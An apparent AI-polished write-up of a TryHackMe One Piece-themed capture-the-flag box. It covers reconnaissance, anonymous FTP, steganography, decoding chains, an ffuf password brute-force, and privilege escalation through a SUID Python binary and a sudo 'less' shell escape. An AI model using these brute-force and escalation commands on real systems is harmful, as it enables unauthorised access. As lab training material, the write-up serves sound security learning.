Certainly! Below is an improved and polished version of your original writeup. The content remains **fully intact**—nothing has been removed—but the structure, grammar, flow, and clarity have been enhanced to improve readability and professionalism, while preserving your voice and all technical details.

---

# **TryHackMe: One Piece-Themed CTF Writeup**

## **Initial Reconnaissance**

Running an `nmap` scan against the target revealed the following open ports and services:

```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             187 Jul 26  2020 welcome.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.134.56
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: New World
```

From the scan:
- **FTP** allows anonymous login.
- **SSH** is running an older version of OpenSSH.
- **HTTP** serves a basic Apache landing page titled *“New World.”*

---

## **Web Enumeration**

### **Source Code Clue**
Within the HTML source of the landing page, the following comment was discovered:
> `Nami ensures there are precisely 3472 possible places where she could have lost it.`  
This appeared to be part of an **OSINT challenge**, though its immediate relevance was unclear.

### **FTP Exploration**
Anonymous FTP access yielded several files:
- **`welcome.txt`**:
  ```
  Welcome to Zou. It is an island located on the back of a massive, millennium-old elephant named Zunesha that roams the New World.
  Except this, there is not much to say about this island.
  ```
- **`.notes.txt`**:
  ```
  Hagrid told me that spells names are not good since they will not "rock you"
  Hermonine loves historical text editors along with reading old books.
  ```
  *(Note: Likely referencing "rockyou" wordlist and "vim"/"emacs" as historical editors.)*

A hidden directory, **`.the_whale_tree`**, was found containing:
- **`.secret_room.txt`**: A dialogue referencing *One Piece* lore—specifically **Road Poneglyphs**, which are ancient stones holding the key to **Laugh Tale** and the legendary **One Piece**.

### **Steganography & First Poneglyph**
Inside `.the_whale_tree`, an image named **`.road_poneglyph.jpg`** concealed a long Base32-like string:
```
FUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBN... (truncated)
```
Decoding this (via CyberChef using **From Base32 → Morse Code → Binary → Hex → Base58 → Base64**) produced:
> `3HTXi9i2T2`

This appeared to be a red herring or partial credential—nothing immediately usable.

---

## **GitHub & Further Enumeration**

A hint led to a GitHub repository:
- **https://github.com/1FreyR/LogPose/blob/master/LogPose.txt**

Directory fuzzing (using `ffuf` with extensions `.html`, `.php`, `.txt`) uncovered:
- **`/dr3ssr0s4.html`**

Further steganalysis of **`/images/rabbit_hole.png`** revealed hex-encoded data:
```
6b 65 79 3a 69 6d 20 6f 6e 20 6f 74 69 20 6f 74 69
```
Which decodes to:
> `key:im on oti oti`

Unclear significance, but retained for later.

### **CSS & Image Traversal**
In the site’s CSS file, a reference to **`/king_kong_gun.jpg`** was found.  
Inside this image’s metadata:  
> `Doflamingo is /ko.jpg`

Accessing **`/ko.jpg`** and running `strings` revealed a PHP endpoint:
> **`/wh0l3_c4k3.php`**

---

## **Cookie Manipulation & Second Poneglyph**

Modifying the session cookie to:
```
CakeForYou
```
unlocked access to **`/wh0l3_c4k3.php`**, which displayed another encoded block identical in structure to the first poneglyph.

Decoding this yielded:
> `55L9sMDppfRjUzVV11Uac`

Again, seemingly a dead end—until progressing further.

---

## **Game Page & Hidden Credentials**

Fuzzing uncovered:
- **`/r4nd0m.html`**, which hosted two games.

One game’s JavaScript (`buggy_games/brain_teaser.js`) contained a hidden path:
> **`/0n1g4sh1m4.php`**

The game logic prevented winning—likely intentional.

Separately, **`kaido.jpeg`** (the only `.jpeg` file on the server) was analyzed. Its metadata leaked a username:
> **`K1ng_0f_th3_B3@sts`**

Using this with `ffuf` against `/0n1g4sh1m4.php`:
```bash
ffuf -u http://10.48.159.231/0n1g4sh1m4.php \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "user=K1ng_0f_th3_B3%40sts&password=FUZZ&submit_creds=Login" \
  -w /opt/rockyou.txt -fs 1503
```
The correct password was found:
> **`thebeast`**

This granted access to the **third Road Poneglyph**, another long encoded string.

---

## **Final Poneglyph & Full Decryption Chain**

After multiple failed attempts to decode the third poneglyph, a writeup hint revealed a hidden endpoint:
> **`/unspecified`**

This contained the **fourth (final) Road Poneglyph**—an even longer encoded string.

Using **CyberChef** with the following recipe:
```
From_Base32 → From_Morse_Code → From_Binary → From_Hex → From_Base58 → From_Base64
```
The full chain decoded to:
> **`M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!`**

This provided valid **SSH credentials**:
- **Username**: `M0nk3y_D_7uffy`
- **Password**: `1_w1ll_b3_th3_p1r@t3_k1ng!`

---

## **Privilege Escalation**

After SSH login, enumeration revealed a **custom SUID binary**:
```bash
     5412   4424 -rwsr-xr-x   1 7uffy_vs_T3@ch teach  4526456 Jul 17 2020 /usr/bin/gomugomunooo_king_kobraaa
```

Running `strings` on the binary showed it internally executed Python code. Since Python wasn’t directly available, the binary itself could be abused.

Using the following command:
```bash
/usr/bin/gomugomunooo_king_kobraaa -c 'import os; os.setresuid(1000, 1000, 1000); os.system("/bin/sh")'
```
Successfully spawned a shell as **`7uffy_vs_T3@ch`**.

Further enumeration showed this user could run **`/usr/local/bin/less`** via `sudo` without a password.

Leveraging `less` for privilege escalation:
```bash
sudo /usr/local/bin/less /anyfile
```
Then typing `:!sh` within `less` spawned a **root shell**.

Alternatively, appending a reverse shell payload to `/usr/local/bin/less` also worked (as noted).

Final flag retrieved. **Root owned.**

---

## **Summary of Key Findings**

- **Anonymous FTP** → Hidden lore & early clues.
- **Steganography** → Multiple encoded “Road Poneglyphs.”
- **Cookie manipulation** → Unlocked hidden PHP page.
- **Image metadata** → Revealed username.
- **Credential brute-force** → `K1ng_0f_th3_B3@sts:thebeast`.
- **Multi-layer decoding** (Base32 → Morse → Binary → Hex → Base58 → Base64) → SSH credentials.
- **Custom SUID binary abuse** → User escalation.
- **Sudo `less` misconfiguration** → Root access.

This machine masterfully blended **One Piece lore**, **multi-stage decoding**, and **classic privilege escalation vectors** into a cohesive and engaging CTF experience.

--- 

Let me know if you'd like this exported in Markdown, PDF, or another format!